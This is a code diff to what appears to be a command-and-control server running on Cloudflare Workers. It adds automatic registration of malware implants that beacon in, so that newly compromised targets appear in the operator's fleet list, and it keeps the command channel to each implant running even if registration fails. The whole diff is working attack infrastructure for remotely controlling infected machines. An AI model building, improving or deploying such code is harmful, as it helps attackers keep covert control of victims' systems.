@@ -33,6 +33,11 @@ app.get('/t/:transport/:implantId', async (c) => {
 // Command delivery is still immediate: the DO resolves the parked poll.
 app.post('/t/poll/:implantId', async (c) => {
   const implantId = c.req.param('implantId');
+  // Fleet discovery: a beacon that polls is an implant that exists. /api/fleet
+  // only ever returned IDs hand-written into KV, so a freshly installed target
+  // was invisible to the operator and read as DEAD. Best effort, never blocking:
+  // a discovery failure must not cost the implant its command channel.
+  c.waitUntil(registerImplant(c.env.FLEET_CONFIG, implantId));
   const stub = c.env.IMPLANT_STATE.get(c.env.IMPLANT_STATE.idFromName(implantId));
   const body = await c.req.text();
   return stub.fetch(new Request(`http://do/poll/${implantId}`, {
@@ -139,6 +144,17 @@ app.get('/api/fleet', async (c) => {
   }
   return c.json({ implants });
 });
+
+// Record an implant in the fleet KV exactly once. The get() guard keeps this at
+// one write per implant instead of one per 30s poll (KV free tier is 1k writes/day).
+async function registerImplant(kv: KVNamespace, implantId: string) {
+  try {
+    if (await kv.get(implantId)) return;
+    await kv.put(implantId, JSON.stringify({ id: implantId, firstSeen: Date.now() }));
+  } catch (e) {
+    // Ignore: discovery is cosmetic, the beacon must never fail because of it.
+  }
+}
 
 // Export DO + default app
 export { ImplantDO } from './durable-object';
